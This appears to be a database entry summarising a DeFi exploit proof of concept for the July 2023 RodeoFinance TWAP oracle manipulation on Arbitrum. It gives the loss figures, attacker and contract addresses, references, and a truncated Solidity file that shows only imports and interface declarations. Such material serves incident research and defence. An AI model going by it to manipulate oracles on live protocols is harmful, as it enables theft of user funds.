# [?] RodeoFinance - TWAP Oracle Manipulation

## Summary
Severity: Unknown
Chain: Arbitrum
Component: RodeoFinance
Published: 2023-07-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/RodeoFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$888k
References:
- https://twitter.com/Phalcon_xyz/status/1678765773396008967
- https://twitter.com/peckshield/status/1678700465587130368
- https://medium.com/@Rodeo_Finance/rodeo-post-mortem-overview-f35635c14101

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~472 Ether (~$888K)
// Attacker : https://arbiscan.io/address/0x2f3788f2396127061c46fc07bd0fcb91faace328
// Attack Contract : https://arbiscan.io/address/0xe9544ee39821f72c4fc87a5588522230e340aa54
// Vulnerable Contract : https://arbiscan.io/address/0xf3721d8a2c051643e06bf2646762522fa66100da
// Attack Tx : https://arbiscan.io/tx/0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1678765773396008967
// https://twitter.com/peckshield/status/1678700465587130368
// https://medium.com/@Rodeo_Finance/rodeo-post-mortem-overview-f35635c14101

interface IInvestor {
    function earn(
        address usr,
        address pol,
        uint256 str,
        uint256 amt,
        uint256 bor,
        bytes memory dat
    ) external returns (uint256);
}

interface ICamelotRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/RodeoFinance_exp.sol_
